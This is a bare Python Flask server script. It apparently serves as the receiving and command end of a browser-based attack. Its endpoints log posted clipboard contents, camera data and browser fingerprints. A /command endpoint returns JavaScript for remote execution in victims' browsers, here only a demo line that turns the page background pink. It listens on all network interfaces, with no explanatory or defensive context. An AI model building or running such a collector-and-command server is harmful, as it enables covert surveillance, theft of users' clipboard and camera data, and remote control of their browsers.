from flask import Flask, request
app = Flask(__name__)

@app.route('/cliplog', methods=['POST'])
def log_clip():
    print(f"[CLIPBOARD] {request.data.decode()}")
    return "ok"

@app.route('/camlog', methods=['POST'])
def log_cam():
    print(f"[CAMERA] {request.data.decode()}")
    return "ok"

@app.route('/fingerprint', methods=['POST'])
def fingerprint():
    print(f"[FINGERPRINT] {request.json}")
    return "ok"

@app.route('/testlog', methods=['POST'])
def testlog():
    print(f"[TEST LOG] {request.json}")
    return "ok"

@app.route('/command')
def give_command():
    return "document.body.style.background='hotpink'"

@app.route('/result', methods=['POST'])
def result():
    print(f"[RESULT] {request.data.decode()}")
    return "ok"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8081)
